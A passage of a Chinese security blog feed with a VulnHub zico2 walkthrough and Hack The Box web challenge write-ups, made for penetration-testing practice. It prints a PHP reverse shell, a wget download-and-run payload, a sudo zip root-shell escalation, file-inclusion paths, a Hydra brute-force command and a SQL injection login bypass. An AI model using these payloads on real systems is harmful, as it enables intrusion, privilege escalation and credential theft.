    <content type="html"><![CDATA[<!-- ttoc --><h2><span id="vulnhub渗透环境">vulnhub渗透环境</span></h2><h3><span id="靶机地址">靶机地址</span></h3><p><a href="https://www.vulnhub.com/entry/zico2-1,210/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/zico2-1,210/</a></p><h3><span id="练习环境">练习环境</span></h3><ul><li>Kali Linux </li><li>VirtualBox</li></ul><h2><span id="信息收集">信息收集</span></h2><p>在信息收集之前需要获取到靶机的IP地址，我靶机在VirtualBox下是<code>Host-Only</code>网络模式，而靶机是无法直接进入系统看到IP地址的。</p><p>这里用到一个kali linux下的一个工具<code>netdiscover</code>基于ARP的网络扫描工具。</p><p>直接执行命令<code>netdiscover</code>:</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20180505223944.png" alt=""></p><p>这里我们获取到两个IP地址，测试发现正确的是<code>192.168.56.102</code></p><p>接下来用<code>nmap</code>扫描端口信息</p><p><code>nmap -A 192.168.56.102</code></p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20180505224409.png" alt=""></p><p>得到80端口上运行着一个Web服务器。</p><p>访问该Web服务，在这个时候我们可以用常见的扫描工具对网站进行扫描</p><h2><span id="漏洞利用">漏洞利用</span></h2><p>这里我简单对页面进行浏览，发现了一个文件包含漏洞。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view.php?page=tools.html</span><br></pre></td></tr></table></figure><p>尝试包含<code>../../etc/passwd</code></p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/vlunhub_zico2_1.png" alt=""></p><p>成功包含，解下来就尝试扫描目录，因为校园网的原因，只能用<code>Host-Only</code>网络模式进行测试，所以一切测试过程都在<code>Kali</code>下进行</p><p>这里尝试去扫描网站的目录，用到<code>kali</code>下的<code>dirb</code>专门用于爆破目录的工具。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/vlunhub_zico2_2.png" alt=""></p><p>得到一个<code>dbadmin</code>的目录</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/vlunhub_zico2_3.png" alt=""></p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/vlunhub_zico2_4.png" alt=""></p><p>这里用到的是一个叫<code>phpLiteAdmin</code>服务器应用，版本号为<code>v1.9.3</code></p><p>尝试找找这个版本的历史漏洞，这个服务是存在一个远程PHP代码注入漏洞的。</p><p>这里可以通过搜索引擎搜索相关漏洞详情也可以用<code>kali</code>下的<code>Searchsploit</code>一个用于Exploit-DB的命令行搜索工具。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/vlunhub_zico2_5.png" alt=""></p><p>这样们就可以看到漏洞详情，这里我们可以看到利用这个远程PHP代码注入漏洞需要登录的。</p><p>所以尝试默认密码<code>admin</code>，发现可以直接登录进去。</p><p>从<code>exploit-db</code>上的资料可以看出，我们需要创建一个数据库，写入一个shell。</p><p>这里可以用nc监听端口来反弹shell，也可以用msf生成php目录进行监听。</p><p>按照<code>exploit-db</code>所说的建立数据库。这里直接创建一个后缀名为<code>.php</code>的数据库<code>shell</code></p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/vlunhub_zico2_6.png" alt=""></p><p>并添加表信息</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/vlunhub_zico2_7.png" alt=""></p><p>这里在本地的<code>/var/www/html</code>目录下创建txt文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $sock=fsockopen(&quot;192.168.56.101&quot;,2333);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);?&gt;</span><br></pre></td></tr></table></figure><p>然后启动apache web服务器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service apache2 start</span><br></pre></td></tr></table></figure><p>然后返回到数据库中添加字段名，类型为<code>TEXT</code>,写入PHP代码来下载执行shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&quot;wget 192.168.56.101/shell.txt -O /tmp/shell.php; php /tmp/shell.php&quot;); ?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/vlunhub_zico2_8.png" alt=""></p><p>需要让目标下载执行这串恶意代码，需要一个HTTP请求。</p><p>这里我们就可以利用到之前发现的本地文件包含的漏洞了。</p><p>我们可以在数据库中发现我们恶意创建的数据库的路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/databases/shell.php</span><br></pre></td></tr></table></figure><p>先用nc监听我们之前设置的端口<code>2333</code></p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/vlunhub_zico2_9.png" alt=""></p><p>这里我们就可以反弹一个shell了。</p><h2><span id="权限提升">权限提升</span></h2><p>在反弹了shell后，对目录进行检查发现了</p><p>/home/zico中有一个<code>wordpress</code>目录，是一个常见的CMS</p><p>进入查看wp-config.php文件。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/vlunhub_zico2_10.png" alt=""></p><p>发现了用户zico的登录凭证，我们可以用<code>ssh</code>来连接。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh zico@192.168.56.102</span><br></pre></td></tr></table></figure><p>利用<code>sudo -l</code>查看目前用户可执行与无法执行的指令；</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/vlunhub_zico2_11.png" alt=""></p><p>这里表明当前用户<code>zico</code>可以利用root权限无密码执行<code>tar</code>和<code>zip</code>命令</p><p>这里可以利用<code>touch exploit</code>创建一个随机文件，并用<code>zip</code>命令进行压缩</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo zip exploit.zip exploit -T --unzip-command=&quot;python -c &apos;import pty; pty.spawn(\&quot;/bin/sh\&quot;)&apos;&quot;</span><br></pre></td></tr></table></figure><ul><li>sudo 用管理员权限执行</li><li>-T 检查文件的完整性。这个参数可以让他执行下一个参数 –unzip-command，在这个参数中写入一个python的交互shell</li></ul><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/vlunhub_zico2_12.png" alt=""></p><p>由此的到<code>root</code>权限，接下来就可以进入<code>/root</code>目录了</p><p><code>cat /root/flag.txt</code>得到flag。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/vlunhub_zico2_13.png" alt=""></p><h2><span id="总结">总结</span></h2><ul><li>vulnhub里面有很多不同的环境提供渗透，第一次完成一次完整的渗透过程，学到了很多东西。</li><li>在文章的开头用到了<code>kali linux</code>下的一个工具<code>netdiscover</code>基于ARP的网络扫描工具。记得在一个师傅的面试经验介绍中，他被面试官问到为什么要用arp去探测内网主机，他回答的是相当隐蔽，探测的信息更准确。主要是因为传统探测远程主机是否存活的方法是通过ICMP协议中的回显应答报文来探测(ping)。很多主机为了避免被扫描器探测，通过防火墙将ICMP包屏蔽，从而达到在网络中隐藏的目的。</li><li>在文章中用到了两种语言的交互shell。分别是php和python，这里参考老外的博客<a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank" rel="noopener">Reverse Shell Cheat Sheet</a></li><li>对于我个人在提权实战经验方面是十分少的，在这次练习中学到了可以利用<code>touch exploit</code>创建一个随机文件，并用<code>zip</code>命令进行压缩，由此可见还是自己的实战经验太少了。</li><li>最后感概下，英文的重要性。国外很多大牛的博客都是很丰富的，而对于一个英语四级425飘过的菜鸡，我也是很无奈的。只能靠百度翻译了。</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- ttoc --&gt;
&lt;h2&gt;&lt;span id=&quot;vulnhub渗透环境&quot;&gt;vulnhub渗透环境&lt;/span&gt;&lt;/h2&gt;&lt;h3&gt;&lt;span id=&quot;靶机地址&quot;&gt;靶机地址&lt;/span&gt;&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;https://www.vulnhub.com/entr
      
    
    </summary>
    
      <category term="笔记" scheme="https://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>hackthebox web challenges</title>
    <link href="https://uknowsec.cn/posts/notes/Hackthebox-Web-Challenges.html"/>
    <id>https://uknowsec.cn/posts/notes/Hackthebox-Web-Challenges.html</id>
    <published>2018-05-05T08:42:38.000Z</published>
    <updated>2019-01-07T08:24:06.095Z</updated>
    
    <content type="html"><![CDATA[<!-- ttoc --><h2><span id="hdc">HDC</span></h2><p>根据题目给出来的提示</p><p><code>Enter your credentials and press [Submit] to access the company&#39;s Control Panel.</code></p><p>并查看源码发现</p><p><code>&lt;input type=&quot;button&quot; value=&quot;Submit&quot; onclick=&quot;doProcess()&quot;/&gt;</code></p><p>在myscripts.js里发现了<code>doProcess()</code>函数</p><p>同时在jquery-3.2.1.js也发现了<code>doProcess()</code>函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">function doProcess() </span><br><span class="line">&#123;var form=document.createElement(&quot;form&quot;);form.setAttribute(&quot;method&quot;,&quot;post&quot;);form.setAttribute(&quot;action&quot;,&quot;main/index.php&quot;);form.setAttribute(&quot;target&quot;,&quot;view&quot;);var hiddenField=document.createElement(&quot;input&quot;);hiddenField.setAttribute(&quot;type&quot;,&quot;hidden&quot;);hiddenField.setAttribute(&quot;name&quot;,&quot;name1&quot;);hiddenField.setAttribute(&quot;value&quot;,&quot;TXlMaXR0bGU&quot;);var hiddenField2=document.createElement(&quot;input&quot;);hiddenField2.setAttribute(&quot;type&quot;,&quot;hidden&quot;);hiddenField2.setAttribute(&quot;name&quot;,&quot;name2&quot;);hiddenField2.setAttribute(&quot;value&quot;,&quot;cDB3bmll&quot;);form.appendChild(hiddenField2);form.appendChild(hiddenField);form.appendChild(hiddenField2);document.body.appendChild(form);window.open(&apos;&apos;,&apos;view&apos;);form.submit();&#125;</span><br></pre></td></tr></table></figure><p>由这里可以得到账号密码<code>TXlMaXR0bGU</code>和<code>cDB3bmll</code>。</p><p>进入系统可以看到有一个可以发邮箱的地方。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20180505171357.png" alt=""></p><p>发现了一个目录<code>secret_area_</code>访问目录下的mails.txt得到一份邮箱表单。</p><p>尝试着用这份邮箱名单去发邮件。</p><p>这里用burp遍历</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20180505171719.png" alt=""></p><p>由此得到flag。</p><h2><span id="lernaean">Lernaean</span></h2><p>这里的提示是</p><p><code>Your target is not very good with computers. Try and guess their password to see if they may be hiding anything!</code></p><p>因为英语比较差，所以搜了下lernaean发现是<code>水蛇许德拉(Lernaean Hydra)</code>的意思。</p><p><code>Hydra</code>一个用来破解密码的工具。所以尝试用<code>Hydra</code>来破解密码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l admin -P /usr/share/wordlists/rockyou.txt 88.198.233.174 http-post-form &quot;/:password=^PASS^:Invalid password!&quot; -s 44134</span><br></pre></td></tr></table></figure><ul><li>-l 指定用户名</li><li>-P 指定字典</li><li>http-post-form POST请求</li><li>:Invalid password!” 密码错误输出的错误信息</li><li>-s 指定端口</li></ul><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20180505173240.png" alt=""></p><p>得到密码登录。页面返回。</p><p><code>Ooops! Too slow!</code></p><p>利用burp提交即可得到flag.</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20180505171719.png" alt=""></p><h2><span id="cartographer">Cartographer</span></h2><p>进到页面是一个登录框，尝试万能密码</p><p><code>&#39; or 1=1#</code></p><p>至今进入页面。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Cartographer</span><br><span class="line">Is Still</span><br><span class="line">Under Construction!</span><br></pre></td></tr></table></figure><p>发现url中好像是文件包含，尝试info=flag</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20180505173920.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- ttoc --&gt;
&lt;h2&gt;&lt;span id=&quot;hdc&quot;&gt;HDC&lt;/span&gt;&lt;/h2&gt;&lt;p&gt;根据题目给出来的提示&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Enter your credentials and press [Submit] to access the company&amp;#
      
    
    </summary>
    
      <category term="笔记" scheme="https://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
</feed>
